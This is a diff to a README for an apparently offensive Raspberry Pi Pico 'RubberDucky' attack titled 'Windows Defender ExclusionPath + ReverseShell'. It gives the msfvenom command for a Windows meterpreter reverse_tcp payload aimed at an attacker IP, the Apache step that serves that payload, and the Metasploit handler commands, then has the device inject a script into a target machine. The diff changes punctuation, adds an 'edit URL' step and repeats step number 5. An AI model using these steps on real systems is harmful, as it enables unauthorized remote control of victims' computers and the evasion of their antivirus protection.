@@ -4,10 +4,10 @@ Windows Defender ExclusionPath + ReverseShell
 1. Create payload using msfvenom in kali linux:
 > $ msfvenom -p windows//x64/meterpreter/reverse_tcp lhost=<attacker IP> lport=<port> -f exe -o /var/www/html/windowsx64.exe
   
-2. Run Apache Service on Kali Linux
+2. Run Apache Service on Kali Linux:
 > $ service apache2 start
   
-3. Run Metasploit on Kali Linux
+3. Run Metasploit on Kali Linux:
 > $ msfconsole <br />
 > $ use exploit/multi/handler <br />
 > $ set payload windows/x64/meterpreter/reverse_tcp <br />
@@ -15,9 +15,11 @@ Windows Defender ExclusionPath + ReverseShell
 > $ set LPORT port <br />
 > $ run
   
-4. Copy payload.dd script to Pi Pico
+4. Copy payload.dd script to Pi Pico.
   
-5. Connect RubberDucky to Target Machine
+5. Open payload.dd, edit URL and save.
+  
+5. Connect RubberDucky to Target Machine.
   
 P/S : Tested on Windows 10 Version 21H1(OS Build 19043.1348)
   
